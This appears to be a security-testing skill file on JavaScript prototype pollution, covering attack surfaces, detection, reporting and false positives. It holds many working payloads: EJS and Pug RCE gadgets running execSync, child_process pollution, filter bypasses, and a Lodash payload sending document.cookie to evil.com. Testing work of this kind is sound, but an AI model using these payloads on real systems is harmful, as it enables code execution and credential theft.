---
name: prototype_pollution
description: JavaScript prototype pollution — server-side (Node.js RCE via gadget chains) and client-side (DOM XSS via polluted properties)
---

# Prototype Pollution

Prototype pollution is a JavaScript-specific vulnerability where an attacker injects properties into `Object.prototype` (or other built-in prototypes), which then propagate to every object in the application. Server-side pollution in Node.js leads to RCE via gadget chains in template engines and framework internals. Client-side pollution leads to DOM XSS via gadgets in jQuery, Lodash, and frontend frameworks.

## Attack Surface

**Server-Side (Node.js)**
- Express/Koa/Fastify body parsers processing JSON with `__proto__` keys
- Deep merge/extend utilities (lodash.merge, lodash.defaultsDeep, jQuery.extend deep)
- Object.assign with user-controlled source objects
- Query string parsers (qs library, express query parser)
- Configuration loaders that recursively merge user input with defaults
- GraphQL resolvers that merge input objects

**Client-Side (Browser)**
- URL query/hash parameters parsed into objects (qs, query-string libraries)
- JSON.parse of user-controlled data followed by deep merge
- postMessage handlers that merge received data
- localStorage/sessionStorage data merged into application state
- URL fragment parsing: `#__proto__[polluted]=true`

**Vulnerable Operations**
```javascript
// Deep merge without prototype check
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      target[key] = target[key] || {};
      merge(target[key], source[key]);  // VULNERABLE
    } else {
      target[key] = source[key];
    }
  }
}

// Lodash vulnerable functions (pre-4.17.12)
_.merge({}, userInput);
_.defaultsDeep({}, userInput);
_.set({}, userControlledPath, value);
_.setWith({}, userControlledPath, value);
```

## Key Vulnerabilities

### Injection Vectors

**JSON body:**
```json
{
  "__proto__": {
    "polluted": "true"
  }
}

{
  "constructor": {
    "prototype": {
      "polluted": "true"
    }
  }
}
```

**Query string (qs library):**
```
?__proto__[polluted]=true
?__proto__.polluted=true
?constructor[prototype][polluted]=true
?constructor.prototype.polluted=true
```

**URL fragment (client-side):**
```
#__proto__[polluted]=true
#constructor[prototype][polluted]=true
```

**Nested object paths (lodash.set):**
```
path: "__proto__.polluted"
path: "constructor.prototype.polluted"
path: ["__proto__", "polluted"]
path: ["constructor", "prototype", "polluted"]
```

### Server-Side RCE Gadgets

**EJS Template Engine:**
```json
{
  "__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"
  }
}
```
When EJS renders any template, the polluted `outputFunctionName` is used in code generation, achieving RCE.

**Pug Template Engine:**
```json
{
  "__proto__": {
    "block": {
      "type": "Text",
      "val": "x]);process.mainModule.require('child_process').execSync('id');//"
    }
  }
}
```

**Handlebars:**
```json
{
  "__proto__": {
    "allowProtoMethodsByDefault": true,
    "allowProtoPropertiesByDefault": true,
    "compileDebug": true,
    "debug": true
  }
}
```

**child_process option pollution:**
```json
{
  "__proto__": {
    "shell": "/proc/self/exe",
    "argv0": "console.log(require('child_process').execSync('id').toString())//"
  }
}
```

When `child_process.fork()` or `child_process.spawn()` is called without explicit options, polluted properties on `Object.prototype` are read as defaults.

**Environment variable injection via prototype:**
```json
{
  "__proto__": {
    "env": {
      "NODE_OPTIONS": "--require /proc/self/environ",
      "NODE_DEBUG": "child_process"
    }
  }
}
```

### Client-Side XSS Gadgets

**jQuery gadgets:**
```javascript
// If Object.prototype is polluted with DOM-related properties,
// jQuery's manipulation methods may read them
// Pollution via jQuery itself:
$.extend(true, {}, JSON.parse('{"__proto__":{"polluted":"xss"}}'));
// Now {}.polluted === "xss"
```

**Lodash template sourceURL:**
```javascript
// Pollute sourceURL for code injection via template compilation
{
  "__proto__": {
    "sourceURL": "\nfetch('//evil.com/'+document.cookie)//"
  }
}
// When _.template() is called, sourceURL is appended to compiled function
```

**DOMPurify bypass (older versions):**
```json
{
  "__proto__": {
    "ALLOWED_TAGS": ["img", "script"],
    "ALLOW_ARIA_ATTR": true
  }
}
```

**Vue.js / React prototype-based rendering manipulation:**
```json
{
  "__proto__": {
    "v-html": "<script>alert(1)</script>",
    "dangerouslySetInnerHTML": {"__html": "<img src=x onerror=alert(1)>"}
  }
}
```

## Detection Methodology

### Server-Side Detection

```bash
# Send pollution probe and check for evidence
curl -X POST https://target.com/api/endpoint \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"polluted":"test123"}}'

# Then check if pollution propagated:
curl https://target.com/api/status
# If response contains "polluted" or "test123" in unexpected places -> confirmed

# Query string variant
curl 'https://target.com/api/endpoint?__proto__[status]=polluted'
```

**Blind detection (OAST-based):**
```bash
# Pollute with a template engine gadget and use OAST callback
curl -X POST https://target.com/api/merge \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"outputFunctionName":"x;require(\"child_process\").execSync(\"curl https://OAST.com\");x"}}'
```

### Client-Side Detection

```javascript
// In browser console after interacting with the target:
console.log(({}).polluted);  // If returns a value, prototype is polluted

// Monitor for pollution:
Object.defineProperty(Object.prototype, '__proto__', {
  set: function(val) {
    console.trace('Prototype pollution attempt:', val);
  }
});
```

**URL-based test:**
```
https://target.com/page?__proto__[test]=polluted
https://target.com/page#__proto__[test]=polluted
```
Then in console: `({}).test` — if it returns `"polluted"`, the parsing library is vulnerable.

## Bypass Techniques

**Keyword Filter Bypass**
- `__proto__` blocked? Use `constructor.prototype` instead
- Both blocked? Try `Object.prototype` pollution via `constructor['prototype']`
- Nested: `{"constructor":{"prototype":{"polluted":"true"}}}`

**JSON Parser Tricks**
- Duplicate keys: `{"__proto__":{},"__proto__":{"polluted":"true"}}`
- Unicode escapes: `{"\u005f\u005fproto\u005f\u005f":{"polluted":"true"}}`
- Prototype of prototype: `{"__proto__":{"__proto__":{"polluted":"true"}}}`

**Content-Type Manipulation**
- Some parsers process `__proto__` differently based on Content-Type
- Try `application/x-www-form-urlencoded` vs `application/json`

## Tools

**pp-finder (prototype pollution finder)**
```bash
# Scan JavaScript files for prototype pollution gadgets
npx pp-finder scan https://target.com/static/js/

# Check specific libraries
npx pp-finder check lodash@4.17.11
```

**Burp Suite**
```
# Use Intruder to fuzz endpoints with pollution payloads
# Set payload positions in JSON body:
{"KEY": {"PROPERTY": "VALUE"}}

# Key payloads: __proto__, constructor.prototype
# Property payloads: polluted, shell, outputFunctionName, sourceURL
# Value payloads: test, /bin/sh, alert(1)
```

**Semgrep Rules**
```bash
# Scan for vulnerable merge patterns
semgrep --config p/javascript-prototype-pollution ./src/

# Custom rule for deep merge without hasOwnProperty
semgrep -e 'for (let $K in $SRC) { ... $TGT[$K] = $SRC[$K] ... }' --lang javascript ./src/
```

**Client-Side Scanner**
```javascript
// Test if current page is vulnerable to URL-based pollution
// Navigate to: https://target.com/page?__proto__[ppTest]=polluted
// Then check in console:
if (({}).ppTest === 'polluted') {
  console.log('Prototype pollution via query string confirmed!');
}
```

## Testing Methodology

1. **Identify merge/extend operations** — Search server and client code for deep merge, Object.assign, lodash.merge, jQuery.extend, and similar operations that process user input
2. **Test injection vectors** — Send `__proto__` and `constructor.prototype` payloads via JSON body, query string, URL fragment, and other input channels
3. **Confirm pollution** — Verify that `Object.prototype` was modified (server: check error responses or behavior changes; client: console check)
4. **Identify gadgets** — Determine which libraries/frameworks are in use and test known gadget chains (EJS, Pug, Handlebars, jQuery, Lodash)
5. **Chain to impact** — Server-side: achieve RCE via template engine or child_process gadgets. Client-side: achieve XSS via DOM write gadgets
6. **Test bypass variants** — If `__proto__` is filtered, test `constructor.prototype` and encoding variations
7. **Assess persistence** — Server-side pollution persists for the lifetime of the process; client-side persists until page reload

## Validation Requirements

1. **Prove pollution** — Demonstrate that `Object.prototype` was modified by showing a newly created empty object inherits the injected property
2. **Show the injection vector** — Document the exact request (endpoint, method, body/params) that triggers pollution
3. **Demonstrate gadget chain** — For server-side: show RCE (command output or OAST callback). For client-side: show XSS execution
4. **Impact assessment** — Server-side RCE is Critical; client-side XSS is High; pollution without a gadget chain is typically Medium/Low
5. **Identify the vulnerable operation** — Point to the specific merge/extend/assign call that allows pollution

## False Positives

- Applications using `Object.create(null)` for user-data objects (no prototype to pollute)
- Libraries that check `hasOwnProperty` before copying keys
- Input validation that blocks `__proto__` and `constructor` keys
- Frameworks that freeze `Object.prototype` (rare but exists)
- Pollution confirmed but no exploitable gadget chain found (real but low impact)

## Impact

- **Remote code execution** — Server-side pollution + template engine gadget = arbitrary command execution
- **DOM XSS** — Client-side pollution + jQuery/Lodash gadget = script execution in victim's browser
- **Denial of service** — Polluting properties that break application logic (e.g., `toString`, `valueOf`, `hasOwnProperty`)
- **Authentication bypass** — Polluting `isAdmin`, `role`, or `authenticated` properties checked via `obj.prop` without hasOwnProperty
- **Security control bypass** — Polluting CORS, CSP, or rate limiting configuration objects

## Pro Tips

1. Server-side pollution with a template engine gadget (EJS, Pug) is almost always Critical severity — prioritize this chain
2. The `constructor.prototype` path bypasses many `__proto__` filters and works in all JavaScript environments
3. Client-side pollution is often exploitable via URL query parameters, making it easy to demonstrate with a clickable PoC link
4. Check for `Object.freeze(Object.prototype)` early — if present, pollution is blocked and you can move on
5. Lodash before 4.17.12 and jQuery before 3.4.0 are vulnerable to deep merge pollution — check version numbers
6. The `outputFunctionName` gadget in EJS is the most reliable server-side RCE chain — always test it first
7. Prototype pollution without a gadget chain is still reportable but expect lower severity; always look for gadgets before reporting
8. Test pollution persistence: on the server, a single pollution request affects all subsequent requests until restart; this amplifies impact significantly

## Summary

Prototype pollution injects attacker-controlled properties into JavaScript's prototype chain, affecting every object in the runtime. Server-side exploitation chains through template engines (EJS, Pug, Handlebars) and child_process options for RCE. Client-side exploitation targets DOM write gadgets in jQuery, Lodash, and frontend frameworks for XSS. Detection starts with identifying deep merge operations on user input; exploitation requires finding a suitable gadget chain in the application's dependencies.
